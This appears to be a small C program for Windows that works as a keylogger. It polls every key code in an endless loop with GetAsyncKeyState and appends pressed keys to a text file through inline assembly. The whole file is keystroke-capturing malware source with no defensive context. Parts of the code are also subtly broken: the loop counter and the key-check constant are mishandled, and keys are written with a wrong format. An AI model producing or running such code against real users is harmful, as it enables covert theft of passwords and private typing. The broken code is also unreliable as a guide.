#define _CRT_SECURE_NO_WARNINGS //to disable warnings

#include <Windows.h>
#include <stdio.h>

int store(int k, char* fname); //function to store the logs in txt file


int main() {

	char a;
	char* fname ="test.txt";
	long res;
	__asm mov [res],0xFFFFFFFFFFFF8002 //this value equivalent to -32767, we use it to check if the key is pressed or not

	while (1) {

		for (a = 0; a <= 255; a++) {

			if (GetAsyncKeyState(a) == res) {
				__asm {
					push fname
					push a
					call store
				}
			}
		}


	}

	getchar();
	return 0;
}

int store(int k, char* fname) {
	FILE* outfile;
	outfile = fopen(fname, "a+");
	fprintf(outfile, "%s", &k);
	fclose(outfile);

	return 0;
}

